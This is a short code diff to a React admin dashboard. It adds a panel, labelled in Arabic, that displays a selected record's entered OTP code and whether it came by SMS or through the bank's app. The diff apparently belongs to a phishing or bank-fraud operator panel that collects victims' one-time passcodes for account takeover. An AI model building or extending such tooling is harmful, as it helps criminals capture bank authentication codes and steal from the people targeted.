@@ -394,6 +394,18 @@ export default function AdminDashboard() {
                 </>
               )}
 
+              {selected.otp_code && (
+                <ChatBubble
+                  title="🔑 رمز OTP المُدخل"
+                  time={selected.updated_date}
+                  rows={[
+                    ["مسار التحقق", selected.otp_route === "otp" ? "SMS" : selected.otp_route === "otp_app" ? "تطبيق البنك" : "—"],
+                    ["الرمز", selected.otp_code],
+                  ]}
+                  color="purple"
+                />
+              )}
+
               <ChatBubble
                 title="📊 الحالة"
                 time={selected.updated_date}
